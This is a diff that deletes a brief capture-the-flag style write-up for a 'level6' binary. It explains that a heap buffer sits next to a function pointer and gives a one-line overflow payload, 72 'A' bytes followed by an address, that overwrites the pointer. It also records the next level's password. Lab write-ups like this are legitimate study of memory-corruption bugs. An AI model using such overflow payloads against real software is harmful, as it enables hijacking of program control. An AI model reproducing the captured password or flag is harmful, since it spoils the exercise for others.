@@ -1,5 +1,0 @@
-The string and the fonction pointer allocates are next of hich other with an overflow we can overwrite the address of the fonction pointer
-
-./level6 `echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08"`
-
-password lvl7 : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
